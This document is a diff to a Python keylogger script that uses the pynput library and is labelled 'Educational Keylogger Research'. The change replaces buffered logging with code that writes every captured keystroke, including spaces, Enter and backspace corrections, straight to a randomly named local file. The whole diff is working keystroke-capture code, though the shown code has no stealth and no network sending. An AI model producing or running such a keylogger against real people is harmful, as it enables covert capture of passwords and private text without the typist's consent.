@@ -12,42 +12,44 @@ def generate_random_filename(extension=".txt", length=8):
 # Define the log file path
 log_file_path = generate_random_filename()
 
-# Store keystrokes in memory and write periodically
-keystroke_buffer = ""
-
 def on_press(key):
-    global keystroke_buffer
-    
     try:
-        if hasattr(key, 'char') and key.char:
-            keystroke_buffer += key.char
-        elif key == keyboard.Key.space:
-            keystroke_buffer += ' '
-        elif key == keyboard.Key.backspace:
-            # Remove last character from buffer
-            keystroke_buffer = keystroke_buffer[:-1]
-        elif key == keyboard.Key.enter:
-            keystroke_buffer += '\n'
-            
-        # Write to file every 10 characters to reduce disk I/O
-        if len(keystroke_buffer) >= 10:
-            with open(log_file_path, 'a', encoding='utf-8') as log_file:
-                log_file.write(keystroke_buffer)
-            keystroke_buffer = ""
-            
+        # Open file in append mode for each keystroke
+        with open(log_file_path, 'a', encoding='utf-8') as log_file:
+            if hasattr(key, 'char') and key.char:
+                log_file.write(key.char)
+                log_file.flush()  # Force write to disk
+            elif key == keyboard.Key.space:
+                log_file.write(' ')
+                log_file.flush()
+            elif key == keyboard.Key.enter:
+                log_file.write('\n')
+                log_file.flush()
+            elif key == keyboard.Key.backspace:
+                # Handle backspace by reading the file, removing last char, and rewriting
+                log_file.close()  # Close the append mode file first
+                
+                # Read current content
+                with open(log_file_path, 'r', encoding='utf-8') as f:
+                    content = f.read()
+                
+                # Remove last character if exists
+                if content:
+                    content = content[:-1]
+                
+                # Write back the modified content
+                with open(log_file_path, 'w', encoding='utf-8') as f:
+                    f.write(content)
+                    
     except Exception as e:
         print(f"Error: {e}")
 
 def on_release(key):
     if key == keyboard.Key.esc:
-        # Write remaining buffer before exiting
-        if keystroke_buffer:
-            with open(log_file_path, 'a', encoding='utf-8') as log_file:
-                log_file.write(keystroke_buffer)
         print(f"Exiting... Log file: {log_file_path}")
         return False
 
-# Write initial message
+# Create initial file
 with open(log_file_path, 'w', encoding='utf-8') as log_file:
     log_file.write("Educational Keylogger Research - Keystroke Log\n")
     log_file.write("=" * 50 + "\n")
